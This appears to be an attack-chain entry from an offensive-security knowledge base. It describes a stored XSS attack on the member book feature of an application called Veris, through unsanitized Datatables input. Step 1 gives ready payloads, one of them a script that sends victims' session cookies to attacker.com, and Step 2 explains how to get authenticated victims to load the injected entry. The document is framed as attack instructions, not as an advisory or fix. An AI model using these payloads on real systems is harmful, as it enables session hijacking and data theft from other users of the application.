---
id: ac-uuid-001
tags:
  - xss
  - stored-xss
  - javascript
  - session-hijacking
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Inject-Malicious-Payload-into-Member-Book]]'
  - '[[procedures/Trigger-XSS-on-Victim-View]]'
step_count: 2
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.443Z'
description: >-
  A stored XSS vulnerability in the Veris application's member book feature
  allows injection of malicious JavaScript via unsanitized inputs in the
  Datatables library, leading to arbitrary code execution when other
  authenticated users view the affected content.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored XSS in Veris Member Book via Datatables for Session Hijacking

Multi-stage attack chain demonstrating a complete stored XSS workflow in the Veris application.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Payload Injection] --> B[Victim Trigger]
    B --> C[Code Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser with developer tools (e.g., Chrome DevTools)

### Target Environment

- Web platform
- Veris application with member book feature
- Authenticated access to the application

### Initial Access Requirements

- Valid user credentials for the Veris application
- Network access to the web application
- No prior access needed beyond authentication

## Detailed Attack Procedures

### Step 1: Payload Injection
procedure: [[procedures/Inject-Malicious-Payload-into-Member-Book]]

**Objective**: Inject a malicious JavaScript payload into the member book feature via an unsanitized input field processed by the Datatables library.

**Instructions**: Authenticate to the Veris application and navigate to the member book section. Locate an input field (e.g., a description or note field) that accepts user content displayed via Datatables. Submit a payload such as `<script>alert('XSS');</script>` or a more advanced one like `<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>` to exfiltrate session data.

**Expected Output**: The payload is stored without sanitization and persists in the member book database.

**Success Indicators**:
- Payload submission succeeds without errors
- No immediate alerts or blocks from the application

### Step 2: Victim Trigger
procedure: [[procedures/Trigger-XSS-on-Victim-View]]

**Objective**: Cause an authenticated victim user to view the affected member book entry, triggering the execution of the injected JavaScript in their browser context.

**Instructions**: Share the link to the member book or wait for the victim to naturally access the feature. When the victim loads the page, the Datatables library renders the unsanitized content, executing the payload.

**Expected Output**: JavaScript executes in the victim's browser, potentially displaying an alert or sending data to an attacker-controlled server.

**Success Indicators**:
- Victim's browser executes the script (e.g., alert pops up or network request to attacker server)
- Session cookies or data are exfiltrated

## Attack Chain Summary

### Key Achievements

1. Successful injection of persistent malicious script into the member book
2. Arbitrary JavaScript execution in victim users' sessions
3. Potential for session hijacking or data theft from other authenticated users

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
